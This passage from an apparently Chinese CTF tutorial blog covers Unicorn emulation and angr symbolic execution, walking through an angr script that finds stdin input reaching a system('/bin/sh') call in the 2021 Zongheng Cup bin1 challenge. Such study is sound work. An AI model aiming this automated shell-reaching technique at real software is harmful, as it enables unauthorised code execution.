class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># code to be emulated</span></span><br><span class="line">X86_CODE32 = <span class="string">b&quot;\x41\x4a&quot;</span> <span class="comment"># INC ecx; DEC edx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory address where emulation starts</span></span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Emulate i386 code&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize emulator in X86-32bit mode</span></span><br><span class="line">    mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">    mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">    mu.mem_write(ADDRESS, X86_CODE32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initialize machine registers</span></span><br><span class="line">    mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">    mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate code in infinite time &amp; unlimited instructions</span></span><br><span class="line">    mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(X86_CODE32))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now print out some registers</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">    r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; ECX = 0x%x&quot;</span> %r_ecx)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; EDX = 0x%x&quot;</span> %r_edx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure><p>这个已经非常直接明白了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2021纵横杯决赛-bin1"><a href="#2021纵横杯决赛-bin1" class="headerlink" title="2021纵横杯决赛-bin1"></a>2021纵横杯决赛-bin1</h3><p>程序是一坨的条件判断,存在一条正确的路径可以在最后拿到shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80485F5</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8054B1A() != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( sub_8054B1A() == <span class="number">1</span> )</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                    .....</span><br><span class="line">                        .....</span><br><span class="line">                        ....</span><br><span class="line">                        ....</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8054B1A() != <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题是无法直接使用</p><p>用符号执行解决这种分支问题有两个思路：</p><ol><li>找到所有从函数入口到system函数的路径，对每条路径进行操作，在每两个基本块之间进行explore</li><li>找到所有从函数入口到system函数的路径，将其他不在路径上的基本块地址添加到<strong>avoid_list</strong>中，再从函数入口开始explore</li></ol><p>这里计算avoid_list的原因是此题的分支数巨大，每一个分支条件语句都可能会使当前的路径再分支出一条新的路径，而且这是<strong>”指数级”</strong>增长的，也就是说符号执行所需要的时间和空间都会随分支数的增长而”指数级”增长，这显然是我们不愿看到的。<br>所以我们需要计算avoid_list，使符号执行引擎忽略某些根本不可能到达system函数的路径，这样在一定程度上避免了上述问题。</p><p>先看一下最终的<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> am_graph<span class="comment">#我没有装angr-managment,但我找到了这个</span></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取system函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg</span>):</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> cfg.functions:</span><br><span class="line">        func = cfg.functions.get(func_addr)</span><br><span class="line">        <span class="keyword">if</span> func.name == <span class="string">&#x27;system&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> func_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取避免执行到的地址列表</span></span><br><span class="line"><span class="comment">#关键！可以大大提高angr符号执行速度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_avoid_list</span>(<span class="params">cfg, start, target</span>):</span><br><span class="line">    <span class="keyword">if</span> start.addr == target:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">    succs = <span class="built_in">list</span>(cfg.successors(start))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(succs) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, [start.addr])</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">1</span>:</span><br><span class="line">        can_reach_target, avoid_list = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">2</span>:</span><br><span class="line">        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[<span class="number">1</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target0 <span class="keyword">and</span> can_reach_target1:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> can_reach_target0 <span class="keyword">and</span> <span class="keyword">not</span> can_reach_target1:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#对目标函数进行符号执行，求解到达call system执行所需要的输入</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore_func</span>(<span class="params">proj, target_func, target_block, target_cfg</span>):</span><br><span class="line">    can_reach_target, avoid_list = get_avoid_list(target_cfg, <span class="built_in">list</span>(target_cfg.nodes)[<span class="number">0</span>], target_block)</span><br><span class="line">    <span class="built_in">print</span>(avoid_list)</span><br><span class="line">    <span class="keyword">if</span> can_reach_target:</span><br><span class="line">    state = proj.factory.call_state(target_func)<span class="comment">#设置初始状态</span></span><br><span class="line">    simgr = proj.factory.simgr(state)</span><br><span class="line">    simgr.use_technique(angr.exploration_techniques.DFS())</span><br><span class="line">    simgr.explore(find=target_block, avoid=avoid_list)</span><br><span class="line">    payload_list = []</span><br><span class="line">    <span class="keyword">for</span> found <span class="keyword">in</span> simgr.found:</span><br><span class="line">        payload_list.append(found.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> payload_list</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#求解所有可行的payload</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explore_payload</span>(<span class="params">bin_path</span>):</span><br><span class="line">    proj = angr.Project(bin_path, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    proj_cfg = proj.analyses.CFGFast()</span><br><span class="line">    system_addr = get_system_addr(proj_cfg)</span><br><span class="line">    <span class="keyword">if</span> system_addr == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Found system function in <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>.&#x27;</span>)</span><br><span class="line">    payload_list = []</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> proj_cfg.functions:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            func = proj_cfg.functions.get(func_addr)</span><br><span class="line">            cfg = func.transition_graph</span><br><span class="line">            cfg = am_graph.to_supergraph(cfg)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes:</span><br><span class="line">                block = proj.factory.block(node.addr)</span><br><span class="line">                <span class="keyword">for</span> inst <span class="keyword">in</span> block.capstone.insns:</span><br><span class="line">                    <span class="keyword">if</span> inst.mnemonic == <span class="string">&#x27;call&#x27;</span> <span class="keyword">and</span> inst.op_str == <span class="string">&quot;&#123;:x&#125;h&quot;</span>.<span class="built_in">format</span>(system_addr):</span><br><span class="line">                        target_func = func_addr</span><br><span class="line">                        target_block = block.addr</span><br><span class="line">                        target_cfg = cfg</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Found target function in <span class="subst">&#123;<span class="built_in">hex</span>(target_func)&#125;</span>&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Found target block in <span class="subst">&#123;<span class="built_in">hex</span>(target_block)&#125;</span>&#x27;</span>)</span><br><span class="line">                        payload_list += explore_func(proj, target_func, target_block, target_cfg)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="built_in">print</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> payload_list</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_run</span>():</span><br><span class="line">    payload_list = explore_payload(<span class="string">&#x27;./bin1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload_list)</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;payload=&#x27;</span> +  b2a_hex(payload).decode())</span><br><span class="line"> </span><br><span class="line">angr_run()</span><br></pre></td></tr></table></figure><p>嘿嘿,完全看不懂捏,一步一步分析一下</p><p>在创建完项目之后,有一句</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proj_cfg = proj.analyses.CFGFast()</span><br></pre></td></tr></table></figure><p>用于进行快速构建控制流图（CFG）的一个分析器。</p><p>因为是自动化pwn,所以选择通过分析获得system的地址</p><p>原作者是这样做的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg</span>):</span><br><span class="line">    <span class="keyword">for</span> func_addr <span class="keyword">in</span> cfg.functions:</span><br><span class="line">        func = cfg.functions.get(func_addr)</span><br><span class="line">        <span class="keyword">if</span> func.name == <span class="string">&#x27;system&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> func_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>但实际上可以更简单的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_system_addr</span>(<span class="params">cfg,func_name</span>):</span><br><span class="line">func = cfg.functions.get(func_name)</span><br><span class="line"><span class="keyword">return</span> func.addr</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_system_addr(proj_cfg,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="number">134513728</span></span><br></pre></td></tr></table></figure><p>甚至</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr = p.loader.find_symbol(<span class="string">&#x27;system&#x27;</span>).rebased_addr</span><br></pre></td></tr></table></figure><p>再然后又初始化了一个列表<code>payload_list = []</code></p><p>然后遍历每个函数并返回一个cfg-graph,又遍历每一个cfg-graph的nodes</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func = proj_cfg.functions.get(func_addr)</span><br><span class="line">cfg = func.transition_graph</span><br><span class="line">cfg = am_graph.to_supergraph(cfg)</span><br></pre></td></tr></table></figure><p><strong>注意</strong>:在获得一个函数的cfg后,又将其转化为了supergraph,这一步是不可或缺的,但少了这一步也能正常执行但就是没有返回结果,因为一般cfg在call处也会停止一个基本块,所以<u>输入函数</u><code>sub_8054B1A</code>也被加入到基本块avoid_list推算,那么<code>sub_8054B1A</code>是肯定无法到达<code>system</code>的,所以非常逆天的就是<code>sub_8054B1A</code>也被加入到avoid_list了,那这样肯定是没有标准输入的…..</p><p>一个node通常表示程序中的一个执行点或者一个特定的结构。在控制流图（CFG）中，节点表示程序中的不同位置或者不同的结构单元.可以是以下几种类型之一：</p><ol><li><strong>基本块节点（Block Node）</strong>：表示程序中的一个连续的指令序列，通常是在程序中的一个基本块（basic block）内。基本块是一组连续执行的指令，没有条件分支，只有一个入口和一个出口。</li><li><strong>函数节点（Function Node）</strong>：表示程序中的一个函数，其中包含了函数的入口点和出口点，以及函数内部的基本块。</li><li><strong>钩子节点（Hook Node）</strong>：表示程序中的一个函数调用的目标，通常是一个库函数或者系统函数。</li><li><strong>其他类型的节点</strong>：根据具体的分析需求和程序结构，控制流图中可能还包含其他类型的节点，如跳转表节点、异常处理节点等</li></ol><p>取每一个node作为一个block,然后去判断block中是否存在对system的调用</p><p>当找到后进入一次explore_func(在本例中只有一处调用了system,也就是函数sub_80485f5,所以循环实际上会且仅会执行一次explore_func)</p><p>explore_func首先进行getav即找到需要避免</p><p>仔细看一下这个getav函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_avoid_list</span>(<span class="params">cfg, start, target</span>):</span><br><span class="line">    <span class="keyword">if</span> start.addr == target:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">    succs = <span class="built_in">list</span>(cfg.successors(start))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(succs) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, [start.addr])</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">1</span>:</span><br><span class="line">        can_reach_target, avoid_list = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(succs) == <span class="number">2</span>:</span><br><span class="line">        can_reach_target0, avoid_list0 = get_avoid_list(cfg, succs[<span class="number">0</span>], target)</span><br><span class="line">        can_reach_target1, avoid_list1 = get_avoid_list(cfg, succs[<span class="number">1</span>], target)</span><br><span class="line">        <span class="keyword">if</span> can_reach_target0 <span class="keyword">and</span> can_reach_target1:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, [])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> can_reach_target0 <span class="keyword">and</span> <span class="keyword">not</span> can_reach_target1:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            avoid_list.append(start.addr)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, avoid_list)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            avoid_list = avoid_list0 + avoid_list1</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, avoid_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ol><li>如果函数开始的第一个节点就是目标节点那么完全不需要什么avoid_list,直接返回可到达,与空avoid</li><li>否则获取后继节点,如果后继节点不存在,那么返回不可到达,并将start.addr作为avoid_list,即这个函数千万别进入</li><li>如果后继节点数量为1,递归调用getav,如果返回值是可到达那么直接返回,如果是不可到达则将该节点地址放入avoid_list并返回</li><li>如果后继节点为2,分别对两个后继节点递归调用getav,如果两个后继节点都能到达则直接返回可到达与空avoid,如果都不可到达则返回不可到达,并添加avoid,否则分开处理</li></ol><p>这里为啥后继节点数量不超过2,如果存在switch结构怎么办?完全不用担心,因为switch在汇编上也是jmp实现的,照样会被识别为多个block</p><p>这个递归函数很重要,极大节省了时间</p><p>视角回到explore_func,此时已经执行完了getav</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">state = proj.factory.call_state(target_func)</span><br><span class="line">   simgr = proj.factory.simgr(state)</span><br><span class="line">   simgr.use_technique(angr.exploration_techniques.DFS())</span><br><span class="line">   simgr.explore(find=target_block, avoid=avoid_list)</span><br><span class="line">   payload_list = []</span><br><span class="line">   <span class="keyword">for</span> found <span class="keyword">in</span> simgr.found:</span><br><span class="line">       payload_list.append(found.posix.dumps(<span class="number">0</span>))</span><br><span class="line">   <span class="keyword">return</span> payload_list</span><br></pre></td></tr></table></figure><p>首先进行了<code>proj.factory.call_state()</code>调用,<code>call_state(target_func)</code> 方法会<u>创建一个初始状态</u>，该状态模拟了执行目标函数 <code>target_func</code> 时的程序状态。这个初始状态包含了函数调用的上下文信息，如函数参数、返回地址等，并且可以被用于后续的符号执行分析。可以用于指定分析特定函数调用时的程序行为</p><p>然后就是常见的创建一个manager,以及指定使用DFS(深度优先算法)进行模拟探索</p><p>正式调用方法<code>explore(find=target_block, avoid=avoid_list)</code>,同时提供之前返回的avoid_list</p><p>最终获得所有发现路径中文件描述符为0的数据,即标准输入的数据,并打印出来</p><h3 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr-ctf"></a>angr-ctf</h3><p><a href="https://ctf-wiki.org/reverse/tools/simulate-execution/angr/">angr - CTF Wiki (ctf-wiki.org)</a>是一个很好的项目帮助快速入门angr的使用,刚刚应该通过这个入门的….</p><h4 id="explore-1"><a href="#explore-1" class="headerlink" title="explore"></a>explore</h4><p><strong>angr_find</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>十分简单的逆向,</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;dist/00_angr_find&#x27;</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x8048678</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p><strong>angr_avoid</strong></p><p>这题的main函数非常庞大导致无法反编译，也无法手动分析程序流程</p><p>但可以看到有一个avoid函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 